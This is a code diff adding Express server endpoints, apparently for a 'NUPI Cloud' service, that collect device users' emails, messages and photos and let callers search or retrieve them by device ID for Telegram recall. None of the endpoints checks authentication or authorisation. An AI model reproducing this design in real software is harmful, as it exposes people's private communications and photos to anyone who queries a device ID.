@@ -2106,6 +2106,149 @@ app.get('/api/network/speed-test', async (req, res) => {
     }
 });
 
+// ===== USER DATA COLLECTION & STORAGE =====
+const userDataStore = new Map(); // In-memory store (can be moved to database)
+
+app.post('/api/user-data/collect', async (req, res) => {
+    try {
+        const data = req.body;
+        const dataId = `${data.deviceId}_${Date.now()}`;
+        
+        // Store collected data
+        userDataStore.set(dataId, {
+            ...data,
+            collected: new Date().toISOString(),
+            id: dataId
+        });
+        
+        console.log(`📧 Collected user data from device: ${data.deviceId}`);
+        console.log(`   - Emails: ${data.emails.length}`);
+        console.log(`   - Messages: ${data.messages.length}`);
+        console.log(`   - Photos: ${data.photos.length}`);
+        
+        res.json({ 
+            success: true, 
+            dataId,
+            message: 'User data stored in NUPI Cloud' 
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Get all data for a specific device
+app.get('/api/user-data/device/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const deviceData = [];
+        
+        userDataStore.forEach((value, key) => {
+            if (value.deviceId === deviceId) {
+                deviceData.push(value);
+            }
+        });
+        
+        res.json({
+            success: true,
+            deviceId,
+            count: deviceData.length,
+            data: deviceData
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Search collected data (for Telegram recall)
+app.post('/api/user-data/search', (req, res) => {
+    try {
+        const { query, deviceId, type } = req.body;
+        const results = [];
+        
+        userDataStore.forEach((value, key) => {
+            if (deviceId && value.deviceId !== deviceId) return;
+            
+            // Search emails
+            if ((!type || type === 'email') && value.emails) {
+                value.emails.forEach(email => {
+                    if (JSON.stringify(email).toLowerCase().includes(query.toLowerCase())) {
+                        results.push({
+                            type: 'email',
+                            data: email,
+                            collected: value.collected,
+                            deviceId: value.deviceId
+                        });
+                    }
+                });
+            }
+            
+            // Search messages
+            if ((!type || type === 'message') && value.messages) {
+                value.messages.forEach(message => {
+                    if (JSON.stringify(message).toLowerCase().includes(query.toLowerCase())) {
+                        results.push({
+                            type: 'message',
+                            data: message,
+                            collected: value.collected,
+                            deviceId: value.deviceId
+                        });
+                    }
+                });
+            }
+            
+            // Search photos
+            if ((!type || type === 'photo') && value.photos) {
+                value.photos.forEach(photo => {
+                    if (JSON.stringify(photo).toLowerCase().includes(query.toLowerCase())) {
+                        results.push({
+                            type: 'photo',
+                            data: photo,
+                            collected: value.collected,
+                            deviceId: value.deviceId
+                        });
+                    }
+                });
+            }
+        });
+        
+        res.json({
+            success: true,
+            query,
+            count: results.length,
+            results: results.slice(0, 50) // Limit to 50 results
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// Get latest data for Telegram quick access
+app.get('/api/user-data/latest/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        let latestData = null;
+        let latestTime = 0;
+        
+        userDataStore.forEach((value, key) => {
+            if (value.deviceId === deviceId) {
+                const time = new Date(value.collected).getTime();
+                if (time > latestTime) {
+                    latestTime = time;
+                    latestData = value;
+                }
+            }
+        });
+        
+        res.json({
+            success: true,
+            data: latestData,
+            message: latestData ? 'Latest data found' : 'No data collected yet'
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
 // ===== STORAGE ANALYSIS =====
 app.post('/api/storage/map', async (req, res) => {
     try {
